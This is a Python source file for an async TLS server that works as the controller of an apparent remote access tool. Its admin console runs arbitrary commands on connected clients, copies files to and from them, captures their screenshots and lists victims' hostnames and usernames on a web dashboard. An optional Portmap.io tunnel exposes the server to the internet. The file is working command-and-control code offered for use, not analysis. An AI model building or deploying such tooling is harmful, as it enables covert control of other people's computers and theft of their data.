"""
server.py - Async TLS server
#1  Heartbeat (auto ping every 30s, drop on timeout)
#2  Client IDs (UUID from hello)
#3  Command queue (per-client async queue)
#4  Async server (asyncio)
#5  File transfer
#6  Logging
#7  Config file (config.yaml)
#8  Client groups
#9  Message routing (broadcast / group / unicast)
#10 Web dashboard
#11 Protobuf protocol
#12 Compression
"""
from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import messages_pb2 as pb
from config_loader import ServerConfig
from protocol import make_env, recv_envelope, send_envelope
from tunnel import PortmapTunnel, TunnelConfig, start_tunnel

# -- Logging (#6) --------------------------------------------------------------
def setup_logging(cfg: ServerConfig):
    logging.basicConfig(
        level=getattr(logging, cfg.log_level.upper(), logging.INFO),
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.FileHandler(cfg.log_file),
            logging.StreamHandler(),
        ],
    )

log = logging.getLogger("tls_server")

# -- Session (#2 client IDs, #8 groups) ---------------------------------------
@dataclass
class Session:
    client_id: str          # UUID from hello
    seq_id: int             # monotonic integer for display
    reader: asyncio.StreamReader
    writer: asyncio.StreamWriter
    hello: pb.Hello = field(default_factory=pb.Hello)
    connected_at: float = field(default_factory=time.time)
    group: str = "default"
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    # -- #3 Command queue ------------------------------------------------------
    cmd_queue: asyncio.Queue = field(default_factory=asyncio.Queue)
    last_pong: float = field(default_factory=time.time)

    @property
    def addr(self) -> str:
        peer = self.writer.get_extra_info("peername", ("?", 0))
        return f"{peer[0]}:{peer[1]}"

    def to_dict(self) -> dict:
        return {
            "id": self.seq_id,
            "uuid": self.client_id,
            "addr": self.addr,
            "group": self.group,
            "hostname": self.hello.hostname,
            "username": self.hello.username,
            "platform": self.hello.platform,
            "pid": self.hello.pid,
            "connected_at": self.connected_at,
        }


sessions: dict[str, Session] = {}    # keyed by UUID
sessions_lock = asyncio.Lock()
_seq = 0


def _next_seq() -> int:
    global _seq
    _seq += 1
    return _seq


# -- TLS context ---------------------------------------------------------------
import ssl

def make_tls_context(cfg: ServerConfig) -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(certfile=cfg.cert_file, keyfile=cfg.key_file)
    if cfg.require_client_cert:
        ctx.verify_mode = ssl.CERT_REQUIRED
        ctx.load_verify_locations(cafile=cfg.ca_file)
    else:
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


# -- Send helper ---------------------------------------------------------------
async def send(session: Session, env: pb.Envelope, compress: bool = True) -> None:
    async with session.lock:
        await send_envelope(session.writer, env, compress)


# -- Request/response ----------------------------------------------------------
async def request(session: Session, env: pb.Envelope, cfg: ServerConfig, timeout: float = 30.0) -> pb.Envelope:
    qid = str(uuid.uuid4())
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    session.cmd_queue._pending = getattr(session.cmd_queue, "_pending", {})
    session.cmd_queue._pending[qid] = fut
    env.msg_id = qid.__hash__() & 0xFFFFFFFF
    await send(session, env, cfg.compression)
    return await asyncio.wait_for(fut, timeout=timeout)


# -- #1 Heartbeat --------------------------------------------------------------
async def heartbeat_loop(session: Session, cfg: ServerConfig) -> None:
    while True:
        await asyncio.sleep(cfg.heartbeat_interval)
        async with sessions_lock:
            if session.client_id not in sessions:
                return
        env = make_env("server")
        env.ping.CopyFrom(pb.Ping())
        try:
            await send(session, env, cfg.compression)
            # Wait for pong via last_pong timestamp
            deadline = time.time() + cfg.heartbeat_timeout
            while time.time() < deadline:
                if session.last_pong > time.time() - cfg.heartbeat_interval - cfg.heartbeat_timeout:
                    break
                await asyncio.sleep(1)
            else:
                log.warning(f"Heartbeat timeout - dropping client {session.seq_id}")
                session.writer.close()
                return
        except Exception:
            return


# -- Client connection handler -------------------------------------------------
async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, cfg: ServerConfig) -> None:
    peer = writer.get_extra_info("peername", ("?", 0))
    addr_str = f"{peer[0]}:{peer[1]}"

    try:
        env = await asyncio.wait_for(recv_envelope(reader), timeout=10.0)
    except Exception as exc:
        log.warning(f"Handshake failed from {addr_str}: {exc}")
        writer.close()
        return

    if env.WhichOneof("payload") != "hello":
        log.warning(f"Bad first message from {addr_str}")
        writer.close()
        return

    # -- #9 Auth token ---------------------------------------------------------
    hello = env.hello
    if hello.auth_token != cfg.auth_token:
        log.warning(f"Auth failed from {addr_str}")
        r = make_env("server")
        r.error_msg.CopyFrom(pb.ErrorMsg(error="auth_failed"))
        await send_envelope(writer, r)
        writer.close()
        return

    client_uuid = env.client_id or str(uuid.uuid4())
    async with sessions_lock:
        seq = _next_seq()
        session = Session(
            client_id=client_uuid,
            seq_id=seq,
            reader=reader,
            writer=writer,
            hello=hello,
            group=hello.group or "default",
        )
        sessions[client_uuid] = session

    ssl_obj = writer.get_extra_info("ssl_object")
    tls_ver = ssl_obj.version() if ssl_obj else "?"
    cipher = ssl_obj.cipher()[0] if ssl_obj else "?"
    log.info(f"Client {session.seq_id} [{client_uuid[:8]}] connected | {tls_ver} {cipher} | "
             f"group={session.group} | {hello.hostname}/{hello.username}")

    # Start heartbeat task
    hb_task = asyncio.create_task(heartbeat_loop(session, cfg))

    # -- Receive loop ----------------------------------------------------------
    try:
        while True:
            incoming = await recv_envelope(reader)
            kind = incoming.WhichOneof("payload")

            if kind == "pong":
                session.last_pong = time.time()
                # Also resolve any pending ping request
                pending = getattr(session.cmd_queue, "_pending", {})
                for key, fut in list(pending.items()):
                    if not fut.done():
                        fut.set_result(incoming)
                        del pending[key]
                        break

            elif kind == "ping":
                r = make_env("server")
                r.pong.CopyFrom(pb.Pong())
                await send(session, r, cfg.compression)

            else:
                # Resolve pending request future if any
                pending = getattr(session.cmd_queue, "_pending", {})
                matched = None
                for qid, fut in list(pending.items()):
                    if not fut.done():
                        fut.set_result(incoming)
                        matched = qid
                        break
                if matched:
                    del pending[matched]
                else:
                    # Unsolicited - put on queue (#3)
                    await session.cmd_queue.put(incoming)

    except Exception as exc:
        log.info(f"Client {session.seq_id} disconnected: {exc}")
    finally:
        hb_task.cancel()
        async with sessions_lock:
            sessions.pop(client_uuid, None)
        try:
            writer.close()
        except Exception:
            pass
        log.info(f"Client {session.seq_id} removed")


# -- #9 Message routing --------------------------------------------------------
async def broadcast(env: pb.Envelope, cfg: ServerConfig, exclude: str = "") -> None:
    async with sessions_lock:
        targets = [s for s in sessions.values() if s.client_id != exclude]
    for s in targets:
        try:
            await send(s, env, cfg.compression)
        except Exception:
            pass


async def group_send(group: str, env: pb.Envelope, cfg: ServerConfig) -> None:
    async with sessions_lock:
        targets = [s for s in sessions.values() if s.group == group]
    for s in targets:
        try:
            await send(s, env, cfg.compression)
        except Exception:
            pass


# -- High-level commands -------------------------------------------------------
async def do_request(session: Session, env: pb.Envelope, cfg: ServerConfig, timeout: float = 35.0) -> pb.Envelope:
    pending = session.cmd_queue._pending = getattr(session.cmd_queue, "_pending", {})
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    key = id(fut)
    pending[key] = fut
    await send(session, env, cfg.compression)
    try:
        return await asyncio.wait_for(fut, timeout=timeout)
    except asyncio.TimeoutError:
        pending.pop(key, None)
        raise


# -- Web dashboard (#10) -------------------------------------------------------
DASH_HTML = """\
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta http-equiv="refresh" content="5">
<title>TLS Dashboard</title>
<style>
body{{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:2rem}}
h1{{color:#58a6ff}} table{{border-collapse:collapse;width:100%}}
th,td{{border:1px solid #30363d;padding:.4rem .8rem;text-align:left}}
th{{background:#161b22;color:#58a6ff}}
tr:nth-child(even){{background:#161b22}}
.g{{color:#3fb950}}.badge{{background:#238636;padding:2px 8px;border-radius:4px;font-size:.8em}}
</style></head><body>
<h1>[TLS] TLS Server Dashboard</h1>
<p>Auto-refresh every 5s &nbsp;|&nbsp; <span class="badge">LIVE</span> &nbsp;|&nbsp; Clients: <b>{count}</b></p>
<table><thead><tr>
<th>ID</th><th>UUID</th><th>Group</th><th>Address</th>
<th>Hostname</th><th>User</th><th>PID</th><th>Connected</th>
</tr></thead><tbody>{rows}</tbody></table>
</body></html>
"""

async def run_dashboard(cfg: ServerConfig) -> None:
    async def handle_http(reader, writer):
        try:
            await reader.readline()
            while True:
                line = await reader.readline()
                if line in (b"\r\n", b"\n", b""):
                    break
            async with sessions_lock:
                items = list(sessions.values())
            rows = ""
            for s in items:
                d = s.to_dict()
                ts = time.strftime("%H:%M:%S", time.localtime(d["connected_at"]))
                rows += (f"<tr><td>{d['id']}</td><td class='g'>{d['uuid'][:8]}</td>"
                         f"<td>{d['group']}</td><td>{d['addr']}</td>"
                         f"<td>{d['hostname']}</td><td>{d['username']}</td>"
                         f"<td>{d['pid']}</td><td>{ts}</td></tr>")
            body = DASH_HTML.format(rows=rows or "<tr><td colspan='8'>No clients</td></tr>",
                                    count=len(items)).encode()
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n"
                         + f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
            await writer.drain()
        except Exception:
            pass
        finally:
            writer.close()

    srv = await asyncio.start_server(handle_http, cfg.host, cfg.dashboard_port)
    log.info(f"Dashboard -> http://{cfg.host}:{cfg.dashboard_port}")
    async with srv:
        await srv.serve_forever()


# -- Admin CLI -----------------------------------------------------------------
def _get_session_by_input(token: str) -> Optional[Session]:
    """Accept seq_id (int) or UUID prefix."""
    try:
        sid = int(token)
        for s in sessions.values():
            if s.seq_id == sid:
                return s
    except ValueError:
        for s in sessions.values():
            if s.client_id.startswith(token):
                return s
    return None


async def admin_loop(cfg: ServerConfig) -> None:
    active: Optional[Session] = None
    loop = asyncio.get_event_loop()

    HELP = ("clients | groups | use <id> | ping | info | exec <cmd> | "
            "file_get <remote> [local] | file_put <local> <remote> | screenshot [out] | "
            "echo <text> | queue | broadcast <msg> | groupsend <group> <msg> | drop | exit")
    print(f"Commands: {HELP}")

    while True:
        try:
            line = await loop.run_in_executor(None, lambda: input("admin> ").strip())
        except (EOFError, KeyboardInterrupt):
            break

        if not line:
            continue
        if line in {"exit", "quit"}:
            break

        # -- clients (#5) ---------------------------------------------------
        if line == "clients":
            async with sessions_lock:
                items = list(sessions.values())
            if not items:
                print("[*] No clients.")
            for s in items:
                print(f"  {s.seq_id:>3} [{s.client_id[:8]}] {s.group:12} {s.hello.hostname}/{s.hello.username} {s.addr}")
            continue

        # -- groups (#8) ----------------------------------------------------
        if line == "groups":
            async with sessions_lock:
                g: dict[str, list] = {}
                for s in sessions.values():
                    g.setdefault(s.group, []).append(s.seq_id)
            for grp, ids in g.items():
                print(f"  {grp}: {ids}")
            continue

        if line.startswith("use "):
            token = line.split(maxsplit=1)[1]
            async with sessions_lock:
                s = _get_session_by_input(token)
            if s:
                active = s
                print(f"[*] Selected client {active.seq_id} [{active.client_id[:8]}]")
            else:
                print("[!] Not found.")
            continue

        def need() -> Optional[Session]:
            if active is None:
                print("[!] Select a client first.")
                return None
            if active.client_id not in sessions:
                print("[!] Client is gone.")
                return None
            return active

        # -- ping -----------------------------------------------------------
        if line == "ping":
            s = need()
            if s:
                env = make_env("server"); env.ping.CopyFrom(pb.Ping())
                try:
                    r = await do_request(s, env, cfg)
                    print(f"pong from {s.seq_id}" if r.HasField("pong") else r)
                except Exception as exc:
                    print(f"[!] {exc}")
            continue

        # -- info -----------------------------------------------------------
        if line == "info":
            s = need()
            if s:
                env = make_env("server"); env.info_request.CopyFrom(pb.InfoRequest())
                try:
                    r = await do_request(s, env, cfg)
                    ir = r.info_response
                    print(json.dumps({
                        "hostname": ir.hostname, "username": ir.username,
                        "pid": ir.pid, "platform": ir.platform,
                        "python": ir.python, "tls": ir.tls_version, "cipher": ir.cipher,
                    }, indent=2))
                except Exception as exc:
                    print(f"[!] {exc}")
            continue

        # -- echo -----------------------------------------------------------
        if line.startswith("echo "):
            s = need()
            if s:
                env = make_env("server"); env.echo_request.CopyFrom(pb.EchoRequest(text=line[5:]))
                try:
                    r = await do_request(s, env, cfg)
                    print(r.echo_response.text)
                except Exception as exc:
                    print(f"[!] {exc}")
            continue

        # -- #2 exec with queue_id ------------------------------------------
        if line.startswith("exec "):
            s = need()
            if s:
                qid = str(uuid.uuid4())[:8]
                env = make_env("server")
                env.exec_request.CopyFrom(pb.ExecRequest(cmd=line[5:], queue_id=qid))
                try:
                    r = await do_request(s, env, cfg, timeout=35.0)
                    er = r.exec_response
                    if er.stdout: print(f"[stdout]\n{er.stdout}")
                    if er.stderr: print(f"[stderr]\n{er.stderr}")
                    print(f"[rc] {er.returncode}")
                    log.info(f"exec qid={qid} client={s.seq_id} rc={er.returncode}")
                except Exception as exc:
                    print(f"[!] {exc}")
            continue

        # -- file_get -------------------------------------------------------
        if line.startswith("file_get "):
            parts = line.split(maxsplit=2)
            remote = parts[1]; local = parts[2] if len(parts) > 2 else os.path.basename(remote)
            s = need()
            if s:
                env = make_env("server")
                env.file_header.CopyFrom(pb.FileHeader(path=remote, push=False))
                try:
                    r = await do_request(s, env, cfg, timeout=60.0)
                    fh = r.file_header
                    Path(local).write_bytes(fh.data)
                    print(f"[+] Saved {len(fh.data)} bytes -> {local}")
                    log.info(f"file_get client={s.seq_id} remote={remote} local={local} size={len(fh.data)}")
                except Exception as exc:
                    print(f"[!] {exc}")
            continue

        # -- file_put -------------------------------------------------------
        if line.startswith("file_put "):
            parts = line.split(maxsplit=2)
            if len(parts) < 3:
                print("[!] Usage: file_put <local> <remote>"); continue
            local, remote = parts[1], parts[2]
            s = need()
            if s:
                try:
                    data = Path(local).read_bytes()
                    env = make_env("server")
                    env.file_header.CopyFrom(pb.FileHeader(path=remote, size=len(data), data=data, push=True))
                    r = await do_request(s, env, cfg, timeout=60.0)
                    print(f"[+] Pushed {len(data)} bytes -> {remote}")
                    log.info(f"file_put client={s.seq_id} local={local} remote={remote} size={len(data)}")
                except Exception as exc:
                    print(f"[!] {exc}")
            continue

        # -- screenshot -----------------------------------------------------
        if line.startswith("screenshot"):
            parts = line.split(maxsplit=1)
            out = parts[1] if len(parts) > 1 else f"shot_{int(time.time())}.png"
            s = need()
            if s:
                env = make_env("server"); env.screenshot_req.CopyFrom(pb.ScreenshotReq())
                try:
                    r = await do_request(s, env, cfg, timeout=30.0)
                    if r.HasField("screenshot_data"):
                        Path(out).write_bytes(r.screenshot_data.data)
                        print(f"[+] Screenshot -> {out} ({len(r.screenshot_data.data)} bytes)")
                        log.info(f"screenshot client={s.seq_id} file={out}")
                    else:
                        print(f"[!] {r.error_msg.error}")
                except Exception as exc:
                    print(f"[!] {exc}")
            continue

        # -- #3 queue - show pending items ----------------------------------
        if line == "queue":
            s = need()
            if s:
                pending = getattr(s.cmd_queue, "_pending", {})
                print(f"Pending responses: {len(pending)} | Queue size: {s.cmd_queue.qsize()}")
            continue

        # -- #9 broadcast ---------------------------------------------------
        if line.startswith("broadcast "):
            text = line[10:]
            env = make_env("server"); env.echo_request.CopyFrom(pb.EchoRequest(text=text))
            await broadcast(env, cfg)
            print(f"[*] Broadcast sent to all clients")
            continue

        # -- #9 groupsend <group> <msg> -------------------------------------
        if line.startswith("groupsend "):
            parts = line.split(maxsplit=2)
            if len(parts) < 3:
                print("[!] Usage: groupsend <group> <message>"); continue
            grp, text = parts[1], parts[2]
            env = make_env("server"); env.echo_request.CopyFrom(pb.EchoRequest(text=text))
            await group_send(grp, env, cfg)
            print(f"[*] Sent to group '{grp}'")
            continue

        if line == "drop":
            s = need()
            if s:
                try:
                    s.writer.close()
                except Exception:
                    pass
                print(f"[*] Dropped {s.seq_id}")
                active = None
            continue

        print(f"Commands: {HELP}")


# -- Entry point ---------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--config", default="config.yaml")
    p.add_argument("--host")
    p.add_argument("--port", type=int)
    p.add_argument("--auth-token")
    p.add_argument("--require-client-cert", action="store_true", default=None)
    return p.parse_args()


async def async_main() -> None:
    args = parse_args()
    cfg = ServerConfig.from_yaml(args.config)
    if args.host:       cfg.host = args.host
    if args.port:       cfg.port = args.port
    if args.auth_token: cfg.auth_token = args.auth_token
    if args.require_client_cert: cfg.require_client_cert = True

    setup_logging(cfg)

    tls_ctx = make_tls_context(cfg)

    async def _handle(r, w):
        await handle_client(r, w, cfg)

    server = await asyncio.start_server(_handle, cfg.host, cfg.port, ssl=tls_ctx)
    log.info(f"TLS server on {cfg.host}:{cfg.port}")

    # -- Portmap.io tunnel -----------------------------------------------------
    tunnel: PortmapTunnel | None = None
    if cfg.tunnel_enabled:
        tcfg = TunnelConfig(
            enabled=True,
            key_file=cfg.tunnel_key_file,
            username=cfg.tunnel_username,
            remote_host=cfg.tunnel_remote_host,
            remote_port=cfg.tunnel_remote_port,
            local_port=cfg.tunnel_local_port,
            restart_delay=cfg.tunnel_restart_delay,
        )
        tunnel = await start_tunnel(tcfg)
    else:
        log.info("Tunnel disabled - local only. Set tunnel.enabled=true in config.yaml to expose globally.")

    try:
        async with server:
            await asyncio.gather(
                server.serve_forever(),
                run_dashboard(cfg),
                admin_loop(cfg),
            )
    finally:
        if tunnel:
            await tunnel.stop()


def main():
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        log.info("Server stopped.")


if __name__ == "__main__":
    main()
